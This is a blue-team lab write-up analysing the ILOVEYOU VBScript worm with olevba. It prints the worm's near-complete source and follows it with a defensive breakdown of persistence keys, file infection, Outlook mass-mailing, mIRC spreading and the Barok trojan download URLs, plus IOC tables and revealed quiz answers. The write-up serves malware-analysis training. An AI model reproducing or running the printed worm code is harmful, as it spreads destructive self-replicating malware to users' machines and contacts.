---
layout: lab
title: ILoveYou
platform: BTLO
difficulty: Easy
category: Endpoint Forensics
skill: Endpoint Forensics
tools: "[Text Editor, Regshot]"
tactics:
mitre: "[T1566.001, T1059.005, T1547.001, T1204.002]"
proof: https://blueteamlabs.online/achievement/share/challenge/144656/14
challenge_url: https://blueteamlabs.online/home/challenge/iloveyou-b9b3e99c9b
permalink: /blue-team/labs/CHANGE-ME/
summary: '"Static analysis of the infamous ILOVEYOU VBScript worm from 2000 using olevba, examining its email propagation mechanism, file infection routines, registry persistence, IRC spreading, and the embedded Barok password-stealing trojan."'
art: https://d2ghw05x0obr70.cloudfront.net/thumbnails/776f552527c0c868c9243ebb6cb9ad6230b94eb9.png
type: challenge
points:
youtube:
locked: tate
---
## Overview

The ILOVEYOU worm needs little introduction — it infected tens of millions of machines in May 2000, spreading via email and causing billions in damage. This challenge analyses the original VBScript source using `olevba` to understand the malware's TTPs without executing it.

```zsh
olevba LOVE-LETTER-FOR-YOU.TXT.vbs.txt
```

<details class="code-block"> <summary>olevba output — LOVE-LETTER-FOR-YOU.TXT.vbs</summary> <pre><code>rem barok -loveletter(vbe) &lt;i hate go to school&gt; rem by: rem  barok -loveletter(vbe) &lt;i hate go to school&gt;
rem by: spyder  /  ispyder@mail.com  /  @GRAMMERSoft Group  /  Manila,Philippines
On Error Resume Next

rem Setup global variables to be used throughout subroutines and functions.
Dim fso, dirsystem, dirwin, dirtemp, eq, ctr, file, vbscopy, dow
eq = ""
ctr = 0

rem Open the current script file and define "vbscopy" which can be used to
rem read its own contents. Used to replicate itself in other files.
Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.OpenTextFile(WScript.ScriptFullname, 1)
vbscopy = file.ReadAll

main()

rem Subroutine to initalize the program
Sub main()
  On Error Resume Next
  Dim wscr, rr

  Set wscr = CreateObject("WScript.Shell")
  rr = wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")

  If (rr &gt;= 1) Then
    wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout", 0, "REG_DWORD"
  End If

  rem Finds special folders, such as system, temporary and windows folders.
  Set dirwin = fso.GetSpecialFolder(0)
  Set dirsystem = fso.GetSpecialFolder(1)
  Set dirtemp = fso.GetSpecialFolder(2)
  Set c = fso.GetFile(WScript.ScriptFullName)

  rem Copy itself into VBScript files MSKernel32.vbs, Win32DLL.vbs and
  rem LOVE-LETTER-FOR-YOU.TXT.vbs
  c.Copy(dirsystem & "\MSKernel32.vbs")
  c.Copy(dirwin & "\Win32DLL.vbs")
  c.Copy(dirsystem & "\LOVE-LETTER-FOR-YOU.TXT.vbs")

  regruns()
  html()
  spreadtoemail()
  listadriv()
End Sub

rem Subroutine to create/update registry values.
Sub regruns()
  On Error Resume Next
  Dim num, downread

  rem Set the system to automatically run MSKernel32.vbs and Win32DLL.vbs on startup.
  regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32", dirsystem & "\MSKernel32.vbs"
  regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32DLL", dirwin & "\Win32DLL.vbs"

  rem Get internet Explorer's download directory.
  downread = ""
  downread = regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")

  rem If the directory wasn't found, then use C:\ drive as the download directory.
  If (downread = "") Then
    downread = "c:\"
  End If

  rem Check if a file named "WinFAT32.exe" exists in the system files.
  If (fileexist(dirsystem & "\WinFAT32.exe") = 1) Then
    Randomize

    rem Generate a random number from 1 to 4.
    num = Int((4 * Rnd) + 1)

    rem Randomly update the Internet Explorer's start page that leads to a
    rem page that will download a malicious executable "WIN-BUGSFIX.exe".
    If num = 1 Then
      regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\StartPage", "http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"
    ElseIf num = 2 Then
      regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\StartPage", "http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqwerWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe"
    ElseIf num = 3 Then
      regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\StartPage", "http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBdQZnmPOhfgER67b3Vbvg/WIN-BUGSFIX.exe"
    ElseIf num = 4 Then
      regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\StartPage", "http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSDGjkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN-BUGSFIX.exe"
    End If
  End If

  rem Check if the "WIN-BUGSFIX.exe" file exists in the download directory.
  If (fileexist(downread & "\WIN-BUGSFIX.exe") = 0) Then
    rem Add WIN-BUGSFIX.exe to run on startup
    regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BUGSFIX", downread & "\WIN-BUGSFIX.exe"
    rem Update Internet Explorer's start page to "about:blank"
    regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\StartPage", "about:blank"
  End If
End Sub

rem Subroutine to list folders in drives.
Sub listadriv()
  On Error Resume Next
  Dim d, dc, s

  Set dc = fso.Drives

  For Each d In dc
    If (d.DriveType = 2) Or (d.DriveType = 3) Then
      folderlist(d.path & "\")
    End If
  Next

  listadriv = s
End Sub

rem Subroutine infect other files, by copying itself into them as well
rem as creating a malicious mIRC script.
Sub infectfiles(folderspec)
  On Error Resume Next
  Dim f, f1, fc, ext, ap, mircfname, s, bname, mp3

  Set f = fso.GetFolder(folderspec)
  Set fc = f.Files

  For Each f1 In fc
    ext = fso.GetExtensionName(f1.path)
    ext = lcase(ext)
    s = lcase(f1.name)

    rem Copies itself into every file with vbs/vbe extension.
    If (ext = "vbs") Or (ext = "vbe") Then
      Set ap = fso.OpenTextFile(f1.path, 2, true)

      ap.write vbscopy
      ap.close
    rem Copies itself into every file with js/jse/css/wsh/sct/hta extension.
    ElseIf (ext = "js")
      Or (ext = "jse")
      Or (ext = "css")
      Or (ext = "wsh")
      Or (ext = "sct")
      Or (ext = "hta")
    Then
      Set ap = fso.OpenTextFile(f1.path, 2, true)

      ap.write vbscopy
      ap.close
      bname = fso.GetBaseName(f1.path)

      Set cop = fso.GetFile(f1.path)

      cop.copy(folderspec & "\" & bname & ".vbs")
      fso.DeleteFile(f1.path)
    rem Copies itself into every file with jpg/jpeg extension.
    ElseIf (ext = "jpg") Or (ext = "jpeg") Then
      rem Copies itself
      Set ap = fso.OpenTextFile(f1.path, 2, true)

      ap.write vbscopy
      ap.close

      Set cop = fso.GetFile(f1.path)

      cop.copy(f1.path & ".vbs")
      fso.DeleteFile(f1.path)
    rem Copies itself into every file with mp3/mp2 extension.
    ElseIf (ext = "mp3") Or (ext = "mp2") Then
      Set mp3 = fso.CreateTextFile(f1.path & ".vbs")

      mp3.write vbscopy
      mp3.close

      Set att = fso.GetFile(f1.path)

      att.attributes = att.attributes + 2
    End If

    If (eq &lt;&gt; folderspec) Then
      rem Looks for mIRC and related files to determine whether it
      rem should create/replace its script.ini with a malicious script.
      If (s = "mirc32.exe")
        Or (s = "mlink32.exe")
        Or (s = "mirc.ini")
        Or (s = "script.ini")
        Or (s = "mirc.hlp")
      Then
        Set scriptini = fso.CreateTextFile(folderspec & "\script.ini")
        rem The following mIRC script checks if the "nick" of a user is the same
        rem as "me" to halt and send a DCC command to send a message to the user
        rem with a link to the LOVE=LETTER-FOR-YOU html page on the system.
        scriptini.WriteLine "[script]"
        scriptini.WriteLine ";mIRC Script"
        scriptini.WriteLine ";  Please dont edit this script... mIRC will corrupt, If mIRC will"
        scriptini.WriteLine "    corrupt... WINDOWS will affect and will not run correctly. thanks"
        scriptini.WriteLine ";"
        scriptini.WriteLine ";Khaled Mardam-Bey"
        scriptini.WriteLine ";http://www.mirc.com"
        scriptini.WriteLine ";"
        scriptini.WriteLine "n0=on 1:JOIN:#:{"
        scriptini.WriteLine "n1=  /If ( $nick == $me ) { halt }"
        scriptini.WriteLine "n2=  /.dcc send $nick" & dirsystem & "\LOVE-LETTER-FOR-YOU.HTM"
        scriptini.WriteLine "n3=}"
        scriptini.close

        eq = folderspec
      End If
    End If
  Next
End Sub

rem Subroutine used to get file listing of a folder.
Sub folderlist(folderspec)
  On Error Resume Next
  Dim f, f1, sf

  Set f = fso.GetFolder(folderspec)
  Set sf = f.SubFolders

  For Each f1 In sf
    infectfiles(f1.path)
    folderlist(f1.path)
  Next
End Sub

rem Subroutine used to create/write registry entries.
Sub regcreate(regkey,regvalue)
  Set regedit = CreateObject("WScript.Shell")
  regedit.RegWrite regkey, regvalue
End Sub

rem Subroutine used to get registry entries.
Function regget(value)
  Set regedit = CreateObject("WScript.Shell")
  regget = regedit.RegRead(value)
End Function

rem Function to check if a file exists.
Function fileexist(filespec)
  On Error Resume Next
  Dim msg

  If (fso.FileExists(filespec)) Then
    msg = 0
  Else
    msg = 1
  End If

  fileexist = msg
End Function

rem Function to check if a folder exists.
Function folderexist(folderspec)
  On Error Resume Next
  Dim msg

  If (fso.GetFolderExists(folderspec)) Then
    msg = 0
  Else
    msg = 1
  End If

  fileexist = msg
End Function

rem Subroutine to send emails to the user's contacts (MAPI)
Sub spreadtoemail()
  On Error Resume Next
  Dim x, a, ctrlists, ctrentries, malead, b, regedit, regv, regad

  Set regedit = CreateObject("WScript.Shell")
  Set out = WScript.CreateObject("Outlook.Application")
  Set mapi = out.GetNameSpace("MAPI")

  rem Goes through all contacts in the address book and sends an email
  rem with the LOVE-LETTER-FOR-YOU program as an attachment.
  For ctrlists = 1 To mapi.AddressLists.Count
    Set a = mapi.AddressLists(ctrlists)
    x = 1
    regv = regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & a)

    If (regv = "") Then
      regv = 1
    End If

    If (int(a.AddressEntries.Count) &gt; int(regv)) Then
      For ctrentries = 1 To a.AddressEntries.Count
        malead = a.AddressEntries(x)
        regad = ""
        regad = regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & malead )

        If (regad = "") Then
          Set male = out.CreateItem(0)

          male.Recipients.Add(malead)
          male.Subject = "ILOVEYOU"
          male.Body = vbcrlf & "kindly check the attached LOVELETTER coming from me."
          male.Attachments.Add(dirsystem & "\LOVE-LETTER-FOR-YOU.TXT.vbs")
          male.Send

          regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & malead, 1, "REG_DWORD"
        End If

        x = x + 1
      Next

      regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & a, a.AddressEntries.Count
    Else
      regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & a, a.AddressEntries.Count
    End If
  Next

  Set out = Nothing
  Set mapi = Nothing
End Sub

rem Subroutine to generate and create the HTML file for LOVE-LETTER-FOR-YOU.HTM.
Sub html
  On Error Resume Next
  Dim lines, n, dta1, dta2, dt1, dt2, dt3, dt4, l1, dt5, dt6

  rem Generates an HTML page which contains JScript and VBScript replicate itself.
  rem by leveraging ActiveX. It also listens for mouse and key events, which
  rem ends up open more windows of the page.
  dta1 = "&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;LOVELETTER - HTML&lt;?-?TITLE&gt;&lt;META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS - LOVELETTER@-@&gt;"
    & vbcrlf & _ "&lt;META NAME=@-@Author@-@ CONTENT=@-@spyder ?-? ispyder@mail.com ?-? @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@&gt;"
    & vbcrlf & _ "&lt;META NAME=@-@Description@-@ CONTENT=@-@simple but i think this is good...@-@&gt;"
    & vbcrlf & _ "&lt;?-?HEAD&gt;&lt;BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ "
    & vbcrlf & _ "ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@&gt;"
    & vbcrlf & _ "&lt;CENTER&gt;&lt;p&gt;This HTML file need ActiveX Control&lt;?-?p&gt;&lt;p&gt;To Enable to read this HTML file&lt;BR&gt;- Please press #-#YES#-# button to Enable ActiveX&lt;?-?p&gt;"
    & vbcrlf & _ "&lt;?-?CENTER&gt;&lt;MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@&gt;----------z--------------------z----------&lt;?-?MARQUEE&gt;"
    & vbcrlf & _ "&lt;?-?BODY&gt;&lt;?-?HTML&gt;"
    & vbcrlf & _ "&lt;SCRIPT language=@-@JScript@-@&gt;"
    & vbcrlf & _ "&lt;!--?-??-?"
    & vbcrlf & _ "If (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"
    & vbcrlf & _ "?-??-?--&gt;"
    & vbcrlf & _ "&lt;?-?SCRIPT&gt;"
    & vbcrlf & _ "&lt;SCRIPT LANGUAGE=@-@VBScript@-@&gt;"
    & vbcrlf & _ "&lt;!--"
    & vbcrlf & _ "on error resume next"
    & vbcrlf & _ "Dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"
    & vbcrlf & _ "aw=1"
    & vbcrlf & _ "code="

  dta2 = "Set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"
    & vbcrlf & _ "Set dirsystem=fso.GetSpecialFolder(1)"
    & vbcrlf & _ "code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"
    & vbcrlf & _ "code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"
    & vbcrlf & _ "code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"
    & vbcrlf & _ "set wri=fso.CreateTextFile(dirsystem&@-@^-^MSKernel32.vbs@-@)"
    & vbcrlf & _ "wri.write code4"
    & vbcrlf & _ "wri.close"
    & vbcrlf & _ "If (fso.FileExists(dirsystem&@-@^-^MSKernel32.vbs@-@)) Then"
    & vbcrlf & _ "If (err.number=424) Then"
    & vbcrlf & _ "aw=0"
    & vbcrlf & _ "End If"
    & vbcrlf & _ "If (aw=1) Then"
    & vbcrlf & _ "document.write @-@ERROR: can#-#t initialize ActiveX@-@"
    & vbcrlf & _ "window.close"
    & vbcrlf & _ "End If"
    & vbcrlf & _ "End If"
    & vbcrlf & _ "Set regedit = CreateObject(@-@WScript.Shell@-@)"
    & vbcrlf & _ "regedit.RegWrite@-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^MSKernel32@-@,dirsystem&@-@^-^MSKernel32.vbs@-@"
    & vbcrlf & _ "?-??-?--&gt;"
    & vbcrlf & _ "&lt;?-?SCRIPT&gt;"

  dt1 = replace(dta1, chr(35) & chr(45) & chr(35), "'")
  dt1 = replace(dt1, chr(64) & chr(45) & chr(64), """")
  dt4 = replace(dt1, chr(63) & chr(45) & chr(63), "/")
  dt5 = replace(dt4, chr(94) & chr(45) & chr(94), "\")
  dt2 = replace(dta2, chr(35) & chr(45) & chr(35), "'")
  dt2 = replace(dt2, chr(64) & chr(45) & chr(64), """")
  dt3 = replace(dt2, chr(63) & chr(45) & chr(63), "/")
  dt6 = replace(dt3, chr(94) & chr(45) & chr(94), "\")

  Set fso = CreateObject("Scripting.FileSystemObject")
  Set c = fso.OpenTextFile(WScript.ScriptFullName, 1)

  lines = Split(c.ReadAll,vbcrlf)
  l1 = ubound(lines)

  For n = 0 to ubound(lines)
    lines(n) = replace(lines(n), "'", chr(91) + chr(45) + chr(91))
    lines(n) = replace(lines(n), """", chr(93) + chr(45) + chr(93))
    lines(n) = replace(lines(n), "\", chr(37) + chr(45) + chr(37))

    If (l1 = n) Then
      lines(n) = chr(34) + lines(n) + chr(34)
    Else
      lines(n) = chr(34) + lines(n) + chr(34) & " & vbcrlf & _"
    End If
  Next

  rem Create the LOVE-LETTER-FOR-YOU.HTM file in the system directory.
  Set b = fso.CreateTextFile(dirsystem + "\LOVE-LETTER-FOR-YOU.HTM")
  b.close

  Set d = fso.OpenTextFile(dirsystem + "\LOVE-LETTER-FOR-YOU.HTM", 2)
  d.write dt5
  d.write join(lines, vbcrlf)
  d.write vbcrlf
  d.write dt6
  d.close
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|CreateTextFile      |May create a text file                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|RegRead             |May read registry keys                       |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.skyinet.n|URL                                          |
|          |et/~young1s/HJKhjnwe|                                             |
|          |rhjkxcvytwertnMTFwet|                                             |
|          |rdsfmhPnjw6587345gvs|                                             |
|          |df7679njbvYT/WIN-   |                                             |
|          |BUGSFIX.exe         |                                             |
|IOC       |http://www.skyinet.n|URL                                          |
|          |et/~angelcat/skladjf|                                             |
|          |lfdjghKJnwetryDGFikj|                                             |
|          |UIyqwerWe546786324hj|                                             |
|          |k4jnHHGbvbmKLJKjhkqj|                                             |
|          |4w/WIN-BUGSFIX.exe  |                                             |
|IOC       |http://www.skyinet.n|URL                                          |
|          |et/~koichi/jf6TRjkcb|                                             |
|          |GRpGqaq198vbFV5hfFEk|                                             |
|          |bopBdQZnmPOhfgER67b3|                                             |
|          |Vbvg/WIN-BUGSFIX.exe|                                             |
|IOC       |http://www.skyinet.n|URL                                          |
|          |et/~chu/sdgfhjksdfjk|                                             |
|          |lNBmnfgkKLHjkqwtuHJB|                                             |
|          |hAFSDGjkhYUgqwerasdj|                                             |
|          |hPhjasfdglkNBhbqwebm|                                             |
|          |znxcbvnmadshfgqw2374|                                             |
|          |61234iuy7thjg/WIN-  |                                             |
|          |BUGSFIX.exe         |                                             |
|IOC       |http://www.mirc.com |URL                                          |
|IOC       |MSKernel32.vbs      |Executable file name                         |
|IOC       |Win32DLL.vbs        |Executable file name                         |
|IOC       |TXT.vbs             |Executable file name                         |
|IOC       |WinFAT32.exe        |Executable file name                         |
|IOC       |BUGSFIX.exe         |Executable file name                         |
|IOC       |mirc32.exe          |Executable file name                         |
|IOC       |mlink32.exe         |Executable file name                         |
|Hex String|#ta#                |23746123                                     |
+----------+--------------------+---------------------------------------------+
.</code></pre> </details>

---

## Investigation

### Initial Access — Email Propagation

The worm arrives as an email attachment with the subject line **ILOVEYOU**, exploiting social engineering and Windows' default behaviour of hiding file extensions — making `LOVE-LETTER-FOR-YOU.TXT.vbs` appear to be a text file. The email body reads:

> `kindly check the attached LOVELETTER coming from me.`

Once executed, the `spreadtoemail()` subroutine iterates through every contact in the victim's **Outlook** address book via MAPI and sends a copy of itself to each one. To avoid duplicate sends it tracks already-contacted addresses in the registry under `HKEY_CURRENT_USER\Software\Microsoft\WAB\`, writing a value of `1` after each successful send.

### Persistence — Registry Run Keys

The `regruns()` subroutine establishes persistence via two autorun registry entries:
```
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32DLL
```

These ensure the worm survives reboots by relaunching its dropped copies on startup.

### Replication — Three Drop Locations

On execution, the worm copies itself to three locations:
```
c:\windows\system32\LOVE-LETTER-FOR-YOU.TXT.vbs
c:\windows\system32\MSKernel32.vbs
c:\windows\Win32DLL.vbs
````

### File Infection

The `infectfiles()` subroutine walks the entire filesystem via `listadriv()`, targeting files by extension and overwriting them with copies of the worm's own code. For `.mp3` and `.mp2` files specifically, it creates a `.vbs` copy alongside the original and sets the original to hidden — making the malicious script appear to be the music file. For `.jpg` and `.jpeg` files, it overwrites the original and deletes it, replacing it with a `.vbs` copy.

### C2 — Browser Hijacking and Trojan Download

The worm checks for `WinFAT32.exe` in the system directory as a marker. If not found, it randomly selects one of four URLs on `hxxp[://]www[.]skyinet[.]net` and sets it as the Internet Explorer homepage — directing the browser to download `WIN-BUGSFIX.exe` on next launch. This executable is **Barok**, a password-stealing trojan written by the same author.

### IRC Spreading via mIRC

When the worm encounters mIRC-related files (`mirc32.exe`, `mirc.ini`, `script.ini`, etc.) during its filesystem walk, it drops a malicious `script.ini` that uses mIRC's DCC functionality to automatically send `LOVE-LETTER-FOR-YOU.HTM` to anyone who joins a channel the victim is in — spreading the worm laterally across IRC networks.

---

## IOCs

|Type|Value|
|---|---|
|Worm filename|`LOVE-LETTER-FOR-YOU.TXT.vbs`|
|Drop — System|`c:\windows\system32\MSKernel32.vbs`|
|Drop — Windows|`c:\windows\Win32DLL.vbs`|
|Drop — System|`c:\windows\system32\LOVE-LETTER-FOR-YOU.TXT.vbs`|
|Trojan|`Barok` (delivered as `WIN-BUGSFIX.exe`)|
|C2 domain|`hxxp[://]www[.]skyinet[.]net`|
|Filesystem marker|`WinFAT32.exe`|
|IRC payload|`script.ini`|
|Persistence key|`HKLM\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32`|
|Contact tracking key|`HKCU\Software\Microsoft\WAB\`|

---

```
olevba LOVE-LETTER-FOR-YOU.TXT.vbs.txt 
olevba 0.60.2 on Python 3.14.3 - http://decalage.info/python/oletools
===============================================================================
FILE: LOVE-LETTER-FOR-YOU.TXT.vbs.txt
Type: Text
-------------------------------------------------------------------------------
VBA MACRO LOVE-LETTER-FOR-YOU.TXT.vbs.txt 
in file: LOVE-LETTER-FOR-YOU.TXT.vbs.txt - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
```





## IOCs 

| Type | Value |
| ---- | ----- |
|      |       |



<div class="qa-item"> <div class="qa-question-text">What is the text present as part of email when the victim received this malware?</div> <div class="flag-reveal"> <input type="checkbox"> <span class="r-placeholder">Click flag to reveal</span> <span class="r-answer">kindly check the attached LOVELETTER coming from me.</span> <button class="copy-btn" onclick="event.stopPropagation();navigator.clipboard.writeText(this.previousElementSibling.textContent);this.textContent='copied';setTimeout(()=>this.textContent='copy',1500)">copy</button> </div> </div>

<div class="qa-item"> <div class="qa-question-text">What is the domain name that was added as the browser's homepage?</div> <div class="answer-reveal"> <input type="checkbox"> <span class="r-placeholder">Click to reveal answer</span> <span class="r-answer">http://www.skyinet.net/</span> <button class="copy-btn" onclick="event.stopPropagation();navigator.clipboard.writeText(this.previousElementSibling.textContent);this.textContent='copied';setTimeout(()=>this.textContent='copy',1500)">copy</button> </div> </div>

<div class="qa-item"> <div class="qa-question-text">The malware replicated itself into 3 locations, what are they?</div> <div class="flag-reveal"> <input type="checkbox"> <span class="r-placeholder">Click flag to reveal</span> <span class="r-answer">c:\windows\system32\LOVE-LETTER-FOR-YOU.TXT.vbs, c:\windows\system32\MSKernel32.vbs, c:\windows\system32\Win32DLL.vbs</span> <button class="copy-btn" onclick="event.stopPropagation();navigator.clipboard.writeText(this.previousElementSibling.textContent);this.textContent='copied';setTimeout(()=>this.textContent='copy',1500)">copy</button> </div> </div>

<div class="qa-item"> <div class="qa-question-text">What is the name of the file that looks for the filesystem?</div> <div class="answer-reveal"> <input type="checkbox"> <span class="r-placeholder">Click to reveal answer</span> <span class="r-answer">winfat32.exe</span> <button class="copy-btn" onclick="event.stopPropagation();navigator.clipboard.writeText(this.previousElementSibling.textContent);this.textContent='copied';setTimeout(()=>this.textContent='copy',1500)">copy</button> </div> </div>

<div class="qa-item"> <div class="qa-question-text">Which file extensions, beginning with m, does this virus target?</div> <div class="flag-reveal"> <input type="checkbox"> <span class="r-placeholder">Click flag to reveal</span> <span class="r-answer">mp2, mp3</span> <button class="copy-btn" onclick="event.stopPropagation();navigator.clipboard.writeText(this.previousElementSibling.textContent);this.textContent='copied';setTimeout(()=>this.textContent='copy',1500)">copy</button> </div> </div>

<div class="qa-item"> <div class="qa-question-text">What is the name of the file generated when the malware identifies any Internet Relay Chat service?</div> <div class="answer-reveal"> <input type="checkbox"> <span class="r-placeholder">Click to reveal answer</span> <span class="r-answer">script.ini</span> <button class="copy-btn" onclick="event.stopPropagation();navigator.clipboard.writeText(this.previousElementSibling.textContent);this.textContent='copied';setTimeout(()=>this.textContent='copy',1500)">copy</button> </div> </div>

<div class="qa-item"> <div class="qa-question-text">What is the name of the password stealing trojan that is downloaded by the malware?</div> <div class="flag-reveal"> <input type="checkbox"> <span class="r-placeholder">Click flag to reveal</span> <span class="r-answer">Barok</span> <button class="copy-btn" onclick="event.stopPropagation();navigator.clipboard.writeText(this.previousElementSibling.textContent);this.textContent='copied';setTimeout(()=>this.textContent='copy',1500)">copy</button> </div> </div>

<div class="qa-item"> <div class="qa-question-text">What is the name of the email service that is targeted by the malware?</div> <div class="answer-reveal"> <input type="checkbox"> <span class="r-placeholder">Click to reveal answer</span> <span class="r-answer">Outlook</span> <button class="copy-btn" onclick="event.stopPropagation();navigator.clipboard.writeText(this.previousElementSibling.textContent);this.textContent='copied';setTimeout(()=>this.textContent='copy',1500)">copy</button> </div> </div>

<div class="qa-item"> <div class="qa-question-text">What is the registry entry responsible for reading the contacts of the logged in email account?</div> <div class="flag-reveal"> <input type="checkbox"> <span class="r-placeholder">Click flag to reveal</span> <span class="r-answer">HKEY_CURRENT_USER\Software\Microsoft\WAB\</span> <button class="copy-btn" onclick="event.stopPropagation();navigator.clipboard.writeText(this.previousElementSibling.textContent);this.textContent='copied';setTimeout(()=>this.textContent='copy',1500)">copy</button> </div> </div>

<div class="qa-item"> <div class="qa-question-text">What is the value that is stored in the registry to remember that an email was already sent to a user?</div> <div class="answer-reveal"> <input type="checkbox"> <span class="r-placeholder">Click to reveal answer</span> <span class="r-answer">1</span> <button class="copy-btn" onclick="event.stopPropagation();navigator.clipboard.writeText(this.previousElementSibling.textContent);this.textContent='copied';setTimeout(()=>this.textContent='copy',1500)">copy</button> </div> </div>

